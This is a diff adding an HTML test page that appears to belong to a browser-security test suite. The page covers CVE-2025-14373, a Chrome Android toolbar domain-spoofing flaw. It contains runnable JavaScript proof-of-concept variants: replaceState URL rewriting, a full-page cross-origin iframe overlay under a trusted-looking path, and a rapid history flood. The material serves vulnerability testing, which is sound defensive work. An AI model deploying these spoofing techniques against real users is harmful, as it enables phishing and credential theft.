@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>SPOOF-CHROME-01: Chrome Android Toolbar Domain Spoofing</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+</head>
+<body class="test-page" style="background:#0d1117;color:#c9d1d9;">
+<div class="container">
+    <a href="../../../index.html" class="btn btn-back">&larr; Back to Suite</a>
+    <h1>Chrome Android Toolbar Domain Spoofing</h1>
+    <div class="meta">
+        <span>ID: SPOOF-CHROME-01</span>
+        <span>CVE: CVE-2025-14373</span>
+        <span>Browsers: Chrome Android (pre-143.0.7499.110)</span>
+        <span>Category: URL Spoofing / Phishing</span>
+    </div>
+
+    <div class="test-section">
+        <h2>Description</h2>
+        <p>CVE-2025-14373 is an inappropriate implementation in Chrome's Toolbar on Android.
+        It allows domain spoofing via <code>history.replaceState()</code> combined with
+        iframe navigation, causing the toolbar to display a trusted domain while loading
+        attacker-controlled content.</p>
+        <p>Discovered by Khalil Zhani. $2,000 bounty. CWE-1021 (Improper Restriction of
+        Rendered UI Layers).</p>
+    </div>
+
+    <div class="test-section">
+        <h2>Technique</h2>
+        <div class="code-block">// Step 1: Page loads with attacker content
+// Step 2: Use history.replaceState to change displayed URL
+// Step 3: Iframe loads attacker content while toolbar shows trusted domain
+
+// Variant 1: replaceState + iframe overlay
+history.replaceState(null, '', '/login');
+// The toolbar may show: abhikafle.com.np/login
+// while an iframe covers the page with ebniw.com content
+
+// Variant 2: Rapid navigation + replaceState
+location.href = 'https://ebniw.com/';
+history.replaceState(null, '', 'https://abhikafle.com.np/dashboard');
+// On vulnerable Chrome Android, toolbar lags behind
+
+// Variant 3: history manipulation timing
+for (let i = 0; i < 50; i++) {
+    history.pushState({i}, '', '/path-' + i);
+}
+// Rapid history changes may confuse toolbar update</div>
+    </div>
+
+    <div class="test-section">
+        <h2>Run Test</h2>
+        <p style="color:#d29922;font-size:0.85em;">Best tested on Chrome for Android. Desktop
+        Chrome has different toolbar update behavior.</p>
+        <button class="btn btn-run" onclick="runTest()">Test replaceState Spoofing</button>
+        <button class="btn" onclick="runVariantRapidHistory()">Variant: Rapid History Changes</button>
+        <button class="btn" onclick="runVariantIframeOverlay()">Variant: Iframe Overlay</button>
+        <div id="output" class="output-box" style="margin-top:10px;"></div>
+    </div>
+</div>
+
+<script src="../../../js/utils.js"></script>
+<script>
+function runTest() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Running toolbar spoofing test...</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Browser: ' + info.browser + ' ' + info.version + '</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Mobile: ' + info.isMobile + '</div>';
+
+    // Test 1: Basic replaceState
+    const originalUrl = location.href;
+    try {
+        history.replaceState(null, 'Spoofed Title', '/secure-login');
+        output.innerHTML += '<div style="color:#58a6ff;">replaceState to /secure-login succeeded.</div>';
+        output.innerHTML += '<div style="color:#8b949e;">Current URL shown: ' + location.href + '</div>';
+        output.innerHTML += '<div style="color:#8b949e;">Check address bar - does it show /secure-login?</div>';
+
+        // Restore
+        setTimeout(function() {
+            history.replaceState(null, '', originalUrl.split('?')[0].split('#')[0]);
+        }, 5000);
+    } catch(e) {
+        output.innerHTML += '<div style="color:#8b949e;">replaceState blocked: ' + e.message + '</div>';
+    }
+
+    // Test 2: Try cross-origin replaceState (should always fail per spec)
+    try {
+        history.replaceState(null, '', 'https://google.com/login');
+        output.innerHTML += '<div style="color:#f85149;font-weight:bold;">VULNERABLE: Cross-origin replaceState succeeded!</div>';
+        reportResult('output', 'Cross-origin replaceState', true, 'Toolbar shows different origin');
+    } catch(e) {
+        output.innerHTML += '<div style="color:#3fb950;">Cross-origin replaceState properly blocked: ' + e.message + '</div>';
+        reportResult('output', 'Cross-origin replaceState', false, 'Properly blocked');
+    }
+}
+
+function runVariantRapidHistory() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">Testing rapid history manipulation...</div>';
+
+    const originalUrl = location.href;
+
+    // Rapidly push many history entries
+    for (let i = 0; i < 50; i++) {
+        try {
+            history.pushState({ idx: i }, '', '/step-' + i);
+        } catch(e) { break; }
+    }
+
+    output.innerHTML += '<div style="color:#8b949e;">Pushed 50 history entries rapidly.</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Current URL: ' + location.href + '</div>';
+    output.innerHTML += '<div style="color:#d29922;">Check if address bar is confused or lagging.</div>';
+
+    // Now try rapid back/forward
+    setTimeout(function() {
+        for (let i = 0; i < 25; i++) {
+            history.back();
+        }
+        output.innerHTML += '<div style="color:#8b949e;">Navigated back 25 times. URL: ' + location.href + '</div>';
+
+        // Cleanup
+        setTimeout(function() {
+            history.replaceState(null, '', originalUrl.split('?')[0].split('#')[0]);
+        }, 3000);
+    }, 500);
+
+    reportResult('output', 'Rapid history manipulation', false,
+        'Manual inspection needed - check if address bar lagged behind content');
+}
+
+function runVariantIframeOverlay() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">Testing iframe overlay technique...</div>';
+
+    // Create a full-page iframe that covers everything
+    const overlay = document.createElement('iframe');
+    overlay.src = CONFIG.XORIGIN_ORIGIN + '/';
+    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:99999;';
+    document.body.appendChild(overlay);
+
+    // Change the URL to something trustworthy
+    try {
+        history.replaceState(null, '', '/my-secure-dashboard');
+    } catch(e) {}
+
+    output.innerHTML += '<div style="color:#d29922;">Full-page iframe overlay created.</div>';
+    output.innerHTML += '<div style="color:#d29922;">Address bar shows: ' + location.href + '</div>';
+    output.innerHTML += '<div style="color:#d29922;">But content is from: ' + CONFIG.XORIGIN_ORIGIN + '</div>';
+
+    // Add close button
+    const closeBtn = document.createElement('button');
+    closeBtn.textContent = 'Close Overlay';
+    closeBtn.style.cssText = 'position:fixed;top:10px;right:10px;z-index:100000;padding:10px;background:#f85149;color:#fff;border:none;border-radius:5px;cursor:pointer;';
+    closeBtn.onclick = function() {
+        document.body.removeChild(overlay);
+        document.body.removeChild(closeBtn);
+        output.innerHTML += '<div style="color:#8b949e;">Overlay removed.</div>';
+    };
+    document.body.appendChild(closeBtn);
+
+    reportResult('output', 'Iframe overlay spoofing', true,
+        'Content from ' + CONFIG.XORIGIN_DOMAIN + ' displayed while URL shows ' + location.hostname +
+        '. Note: This is a design issue, not a browser bug per se.');
+}
+</script>
+</body>
+</html>
